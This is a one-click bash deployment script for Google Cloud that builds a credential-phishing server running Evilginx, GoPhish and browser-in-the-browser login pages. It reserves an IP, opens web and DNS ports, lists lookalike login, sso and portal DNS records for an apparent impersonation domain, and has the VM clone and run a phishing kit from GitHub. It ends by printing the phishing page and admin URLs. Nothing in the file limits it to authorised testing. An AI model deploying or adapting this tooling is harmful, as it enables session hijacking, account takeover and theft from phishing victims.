#!/bin/bash

#############################################
# Google Cloud Platform - One-Click Deployment
# Creates VM, configures firewall, deploys Frameless BITB
#############################################

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
PROJECT_ID="${GCP_PROJECT_ID:-frameless-bitb-$(date +%s)}"
INSTANCE_NAME="${INSTANCE_NAME:-evilginx-server}"
ZONE="${ZONE:-us-central1-a}"
REGION="${REGION:-us-central1}"
MACHINE_TYPE="${MACHINE_TYPE:-e2-medium}"
BOOT_DISK_SIZE="${BOOT_DISK_SIZE:-30GB}"
DOMAIN="${DOMAIN:-exodustraderai.info}"
EMAIL="${EMAIL:-admin@${DOMAIN}}"
YOUR_IP=""

log() {
    echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
    exit 1
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

prompt() {
    echo -e "${CYAN}[INPUT]${NC} $1"
}

header() {
    echo ""
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Check if we're in Cloud Shell
detect_cloud_shell() {
    if [ -n "$CLOUD_SHELL" ]; then
        info "Running in Google Cloud Shell ☁️"
        info "You're already authenticated and ready to go!"
        return 0
    else
        info "Running on local machine"
        return 1
    fi
}

# Check if gcloud is installed
check_gcloud() {
    if ! command -v gcloud &> /dev/null; then
        error "gcloud CLI not found. Install from: https://cloud.google.com/sdk/docs/install"
    fi
    log "gcloud CLI found"
}

# Get user's IP for firewall rules
get_user_ip() {
    log "Detecting your IP address..."
    YOUR_IP=$(curl -s https://api.ipify.org)
    if [ -z "$YOUR_IP" ]; then
        warning "Could not auto-detect IP"
        prompt "Enter your IP address (for GoPhish admin access):"
        read -r YOUR_IP
    fi
    log "Your IP: $YOUR_IP"
}

# Display configuration
show_config() {
    header "Deployment Configuration"
    echo -e "${CYAN}Project ID:${NC}      $PROJECT_ID"
    echo -e "${CYAN}Instance Name:${NC}   $INSTANCE_NAME"
    echo -e "${CYAN}Region:${NC}          $REGION"
    echo -e "${CYAN}Zone:${NC}            $ZONE"
    echo -e "${CYAN}Machine Type:${NC}    $MACHINE_TYPE"
    echo -e "${CYAN}Disk Size:${NC}       $BOOT_DISK_SIZE"
    echo -e "${CYAN}Domain:${NC}          $DOMAIN"
    echo -e "${CYAN}Email:${NC}           $EMAIL"
    echo -e "${CYAN}Your IP:${NC}         $YOUR_IP"
    echo ""
    prompt "Continue with this configuration? (y/n): "
    read -r confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        info "Deployment cancelled"
        exit 0
    fi
}

# Create or select GCP project
setup_project() {
    header "Setting Up GCP Project"

    # Check if project exists
    if gcloud projects describe "$PROJECT_ID" &>/dev/null; then
        log "Project $PROJECT_ID already exists"
    else
        log "Creating new project: $PROJECT_ID"
        gcloud projects create "$PROJECT_ID" --name="Frameless BITB" || error "Failed to create project"
    fi

    # Set current project
    log "Setting active project..."
    gcloud config set project "$PROJECT_ID"

    # Check billing
    warning "Ensure billing is enabled for this project!"
    info "Visit: https://console.cloud.google.com/billing/linkedaccount?project=$PROJECT_ID"
    prompt "Press Enter after enabling billing..."
    read -r
}

# Enable required APIs
enable_apis() {
    header "Enabling Required APIs"

    log "Enabling Compute Engine API..."
    gcloud services enable compute.googleapis.com || error "Failed to enable Compute Engine API"

    log "Enabling Cloud Resource Manager API..."
    gcloud services enable cloudresourcemanager.googleapis.com || true

    log "APIs enabled successfully"
}

# Reserve static IP
reserve_ip() {
    header "Reserving Static IP Address"

    IP_NAME="evilginx-static-ip"

    # Check if IP already exists
    if gcloud compute addresses describe "$IP_NAME" --region="$REGION" &>/dev/null; then
        log "Static IP already exists"
    else
        log "Creating static IP address..."
        gcloud compute addresses create "$IP_NAME" --region="$REGION" || error "Failed to reserve IP"
    fi

    # Get IP address
    STATIC_IP=$(gcloud compute addresses describe "$IP_NAME" --region="$REGION" --format="get(address)")
    log "Static IP reserved: $STATIC_IP"

    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  IMPORTANT: Configure DNS Records${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Add these DNS records for domain: ${DOMAIN}${NC}"
    echo ""
    echo -e "${CYAN}Type: A    Name: @           Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: *           Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: login       Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: account     Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: www         Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: sso         Value: ${STATIC_IP}${NC}"
    echo -e "${CYAN}Type: A    Name: portal      Value: ${STATIC_IP}${NC}"
    echo ""
    echo -e "${YELLOW}Configure these at your domain registrar.${NC}"
    echo ""
    prompt "Press Enter after configuring DNS records..."
    read -r
}

# Create firewall rules
create_firewall() {
    header "Creating Firewall Rules"

    # HTTP
    if gcloud compute firewall-rules describe allow-http-evilginx &>/dev/null; then
        log "HTTP firewall rule already exists"
    else
        log "Creating HTTP firewall rule..."
        gcloud compute firewall-rules create allow-http-evilginx \
            --target-tags=evilginx-server \
            --allow=tcp:80 \
            --source-ranges=0.0.0.0/0 \
            --description="Allow HTTP traffic" || warning "Failed to create HTTP rule"
    fi

    # HTTPS
    if gcloud compute firewall-rules describe allow-https-evilginx &>/dev/null; then
        log "HTTPS firewall rule already exists"
    else
        log "Creating HTTPS firewall rule..."
        gcloud compute firewall-rules create allow-https-evilginx \
            --target-tags=evilginx-server \
            --allow=tcp:443 \
            --source-ranges=0.0.0.0/0 \
            --description="Allow HTTPS traffic" || warning "Failed to create HTTPS rule"
    fi

    # DNS
    if gcloud compute firewall-rules describe allow-dns-evilginx &>/dev/null; then
        log "DNS firewall rule already exists"
    else
        log "Creating DNS firewall rule..."
        gcloud compute firewall-rules create allow-dns-evilginx \
            --target-tags=evilginx-server \
            --allow=tcp:53,udp:53 \
            --source-ranges=0.0.0.0/0 \
            --description="Allow DNS traffic" || warning "Failed to create DNS rule"
    fi

    # GoPhish Admin
    if gcloud compute firewall-rules describe allow-gophish-admin &>/dev/null; then
        log "GoPhish admin firewall rule already exists"
    else
        log "Creating GoPhish admin firewall rule (restricted to your IP)..."
        gcloud compute firewall-rules create allow-gophish-admin \
            --target-tags=evilginx-server \
            --allow=tcp:3333 \
            --source-ranges="${YOUR_IP}/32" \
            --description="Allow GoPhish admin access" || warning "Failed to create GoPhish admin rule"
    fi

    log "Firewall rules configured"
}

# Create startup script
create_startup_script() {
    cat > /tmp/evilginx-startup.sh <<'STARTUP_EOF'
#!/bin/bash
set -e

# Log everything
exec > >(tee /var/log/evilginx-startup.log)
exec 2>&1

echo "Starting Frameless BITB installation..."

# Wait for system to be ready
sleep 30

# Update system
apt update
apt upgrade -y

# Install git
apt install -y git

# Clone repository
cd /root
if [ ! -d "frameless-bitb" ]; then
    git clone https://github.com/waelmas/frameless-bitb.git
fi

cd frameless-bitb

# Run installation
DOMAIN="DOMAIN_PLACEHOLDER" EMAIL="EMAIL_PLACEHOLDER" bash setup-gcloud.sh

echo "Installation complete!"
STARTUP_EOF

    # Replace placeholders
    sed -i "s/DOMAIN_PLACEHOLDER/${DOMAIN}/g" /tmp/evilginx-startup.sh
    sed -i "s/EMAIL_PLACEHOLDER/${EMAIL}/g" /tmp/evilginx-startup.sh
}

# Create VM instance
create_instance() {
    header "Creating VM Instance"

    # Check if instance exists
    if gcloud compute instances describe "$INSTANCE_NAME" --zone="$ZONE" &>/dev/null; then
        warning "Instance $INSTANCE_NAME already exists"
        prompt "Delete and recreate? (y/n): "
        read -r confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            log "Deleting existing instance..."
            gcloud compute instances delete "$INSTANCE_NAME" --zone="$ZONE" --quiet
        else
            info "Using existing instance"
            return
        fi
    fi

    # Create startup script
    create_startup_script

    log "Creating VM instance: $INSTANCE_NAME"

    gcloud compute instances create "$INSTANCE_NAME" \
        --zone="$ZONE" \
        --machine-type="$MACHINE_TYPE" \
        --image-family=ubuntu-2204-lts \
        --image-project=ubuntu-os-cloud \
        --boot-disk-size="$BOOT_DISK_SIZE" \
        --boot-disk-type=pd-balanced \
        --tags=evilginx-server,http-server,https-server \
        --address="$STATIC_IP" \
        --metadata-from-file=startup-script=/tmp/evilginx-startup.sh || error "Failed to create instance"

    log "VM instance created successfully"
    log "Instance is installing Frameless BITB (this takes 15-30 minutes)"

    # Clean up
    rm /tmp/evilginx-startup.sh
}

# Wait for installation
wait_for_installation() {
    header "Monitoring Installation Progress"

    info "Installation is running on the server..."
    info "This will take approximately 15-30 minutes"
    echo ""

    log "Waiting for instance to be ready (60 seconds)..."
    sleep 60

    log "Connecting to view installation logs..."
    echo ""
    echo -e "${YELLOW}Press Ctrl+C when you see 'Installation completed successfully'${NC}"
    echo -e "${YELLOW}Or wait for the command to timeout${NC}"
    echo ""
    sleep 5

    # Try to tail the installation log
    gcloud compute ssh "$INSTANCE_NAME" \
        --zone="$ZONE" \
        --command="sudo tail -f /var/log/evilginx-startup.log" || true

    echo ""
    log "You can check installation status anytime with:"
    echo -e "${CYAN}gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo tail -f /var/log/evilginx-startup.log'${NC}"
}

# Display summary
show_summary() {
    header "Deployment Summary"

    echo -e "${GREEN}✓ Project created:${NC}         $PROJECT_ID"
    echo -e "${GREEN}✓ Instance created:${NC}        $INSTANCE_NAME"
    echo -e "${GREEN}✓ Static IP:${NC}               $STATIC_IP"
    echo -e "${GREEN}✓ Firewall configured${NC}"
    echo -e "${GREEN}✓ Installation started${NC}"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  Access Information${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}Phishing Page:${NC}"
    echo -e "  https://login.${DOMAIN}/?auth=2"
    echo ""
    echo -e "${CYAN}GoPhish Admin:${NC}"
    echo -e "  https://${STATIC_IP}:3333"
    echo ""
    echo -e "${CYAN}SSH Access:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  Management Commands${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}SSH into server:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo -e "${CYAN}Check installation logs:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo tail -f /var/log/evilginx-startup.log'"
    echo ""
    echo -e "${CYAN}Check services status:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='bitb-status'"
    echo ""
    echo -e "${CYAN}View service logs:${NC}"
    echo -e "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='bitb-logs'"
    echo ""
    echo -e "${CYAN}Stop instance:${NC}"
    echo -e "  gcloud compute instances stop $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo -e "${CYAN}Start instance:${NC}"
    echo -e "  gcloud compute instances start $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo -e "${CYAN}Delete instance:${NC}"
    echo -e "  gcloud compute instances delete $INSTANCE_NAME --zone=$ZONE"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  Next Steps${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "1. Wait for installation to complete (15-30 minutes)"
    echo "2. SSH into server and run: sudo bash test-setup.sh"
    echo "3. Access phishing page: https://login.${DOMAIN}/?auth=2"
    echo "4. Access GoPhish admin: https://${STATIC_IP}:3333"
    echo "5. Change GoPhish default password immediately!"
    echo ""
    echo -e "${GREEN}Deployment complete!${NC}"
    echo ""
}

# Main deployment function
main() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     Google Cloud Platform - Frameless BITB Deployment        ║
║                                                               ║
║     Automated deployment of Evilginx + GoPhish + BITB        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo ""

    detect_cloud_shell
    check_gcloud
    get_user_ip
    show_config
    setup_project
    enable_apis
    reserve_ip
    create_firewall
    create_instance
    wait_for_installation
    show_summary
}

# Run main function
main "$@"
